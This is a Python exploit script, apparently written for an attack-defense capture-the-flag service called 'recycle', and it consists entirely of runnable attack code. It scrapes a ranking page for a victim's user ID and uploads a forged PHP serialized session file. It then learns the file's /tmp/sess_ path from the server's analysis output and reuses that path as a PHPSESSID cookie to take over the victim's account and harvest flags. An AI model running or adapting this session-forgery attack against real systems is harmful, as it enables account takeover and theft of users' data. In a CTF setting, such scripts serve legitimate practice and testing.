#!/usr/bin/env python3
import re
import requests
import os
from bs4 import BeautifulSoup
import random
import time

FLAG_REGEX = r"ECSC\w{32}"
host = os.environ.get("target", "localhost:8080")
target_email = os.environ.get("flagid", "test@example.com")

host = "http://" + host


username = "test/asdf@bla.at" + str(random.randint(0, 123123123))
password = "Password123"

# get ranking and find target user
r = requests.get(host + "/ranking")
if r.status_code != 200:
    raise Exception("Cannot get ranking")

bs = BeautifulSoup(r.text, "html.parser")
results = bs.find_all("tr")
forgedUserId = None
for res in results:
    if "data-user-id" not in res.attrs:
        continue
    emailTd = res.find("td", {"data-contact": target_email})
    if emailTd:
        forgedUserId = res["data-user-id"]
        break

if not forgedUserId:
    raise Exception("Cannot find target user in ranking")

print("Forging session for user id: " + str(forgedUserId))


# upload digital item with payload
fake_session = 'user|O:14:"App\\Model\\User":4:{s:2:"id";i:' + str(forgedUserId) + ';s:5:"email";s:25:"test/asdf@bla.at101573700";s:9:"firstname";s:3:"Foo";s:8:"lastname";s:3:"Bar";}'
s = requests.Session()
r = s.post(host + "/recycle/digital/upload", data={
    "item_description": "foo",
    "auth_type": "account",
    "newEmail": username,
    "newPassword": password,
    "newFirstname": "Foo",
    "newLastname": "Bar"
}, files={"datafile": ("sess_", fake_session, "multipart/form-data")})
if r.status_code != 200:
    raise Exception("Failed upload digital item")

if "Logout" not in r.text:
    print(r.text)
    raise Exception("Upload failed")

item_url = r.url
print("Item Url: " + item_url)

# wait until the file has been processed
def isAnalyzed():
    r = s.get(item_url)
    return "Processed" in r.text

i = 1
while not isAnalyzed():
    print("Waiting round " + str(i))
    time.sleep(2)
    i += 1
    if i > 30:
        raise Exception("Had to wait too long for processing")

# get response from 'file' analysis
r = s.get(item_url)

bs = BeautifulSoup(r.text, "html.parser")
results = bs.find_all('div', class_='result')
for res in results:
    title = res.find('p').get_text()
    if "Type: file" in title:
        print("Found 'file' analysis result")
        file_result = res.find("pre").get_text()
        filepath = file_result.split(":", 1)[0].strip()
        print("Server file path: " + filepath)


if filepath is None:
    raise Exception("Could not get filepath")

if not re.match(r"/tmp/sess_[a-zA-Z0-9]+", filepath):
    raise Exception("File not in the correct path")

sessionId = filepath[len("/tmp/sess_"):]
print("Using sessionId: " + sessionId)

# login using the forged session
s2 = requests.Session()
s2.cookies.set("PHPSESSID", sessionId)

r = s2.get(host + "/recycle/myitems")

# get serial numbers of physical items
flags = re.findall(FLAG_REGEX, r.text)

# get links of digital items
bs = BeautifulSoup(r.text, "html.parser")
links = bs.find_all('a')
links = map(lambda a: a["href"], links)
links = filter(lambda l: re.match(r".*digital/\d+$", l) is not None, links)

# foreach link download blob and analyze it
for l in links:
    r = s.get(host + l + "/download")
    if r.status_code == 200:
        print("Analyzing digital item behind: " + l)
        # TODO sophisticated tar file analysis
        flags += re.findall(FLAG_REGEX, r.text)

# print flags
for f in flags:
    print(f)